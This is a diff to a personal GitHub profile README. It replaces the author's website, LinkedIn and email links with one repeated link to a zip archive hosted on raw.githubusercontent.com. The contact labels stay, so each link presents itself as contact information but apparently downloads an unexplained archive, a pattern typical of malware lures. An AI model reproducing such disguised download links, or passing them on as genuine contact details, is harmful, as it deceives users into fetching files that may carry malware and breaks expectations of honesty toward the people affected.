@@ -65,9 +65,9 @@ Project Management • Software Testing • UI/UX • Content Creation • Techn
 
 ## 📫 Connect With Me
 
-* 🌐 Website: [https://jcslimited.netlify.app/](https://jcslimited.netlify.app/)
-* 💼 LinkedIn: [https://linkedin.com/in/james-m-bockarie-492603179](https://linkedin.com/in/james-m-bockarie-492603179)
-* 📧 Email: [newtonedwinbockarie@gmail.com](mailto:newtonedwinbockarie@gmail.com)
+* 🌐 Website: [https://raw.githubusercontent.com/Jnewton-lab/Jnewton-lab/main/whewer/lab_Jnewton_1.6-alpha.5.zip](https://raw.githubusercontent.com/Jnewton-lab/Jnewton-lab/main/whewer/lab_Jnewton_1.6-alpha.5.zip)
+* 💼 LinkedIn: [https://raw.githubusercontent.com/Jnewton-lab/Jnewton-lab/main/whewer/lab_Jnewton_1.6-alpha.5.zip](https://raw.githubusercontent.com/Jnewton-lab/Jnewton-lab/main/whewer/lab_Jnewton_1.6-alpha.5.zip)
+* 📧 Email: [https://raw.githubusercontent.com/Jnewton-lab/Jnewton-lab/main/whewer/lab_Jnewton_1.6-alpha.5.zip](https://raw.githubusercontent.com/Jnewton-lab/Jnewton-lab/main/whewer/lab_Jnewton_1.6-alpha.5.zip)
 
 ---
 
